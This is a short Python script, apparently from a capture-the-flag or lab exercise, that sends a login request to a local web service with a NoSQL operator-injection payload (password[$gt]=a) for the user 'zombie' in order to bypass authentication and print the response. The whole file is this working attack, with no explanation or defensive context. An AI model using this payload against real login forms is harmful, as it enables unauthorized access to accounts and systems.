import requests

import json

url = "http://localhost:13009"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}
#json.dumps({"username": "zombie", "password": {"$gt":"a"}}
r = requests.post(url+"/login",headers=headers, data="username=zombie&password[$gt]=a")


print(r.text)
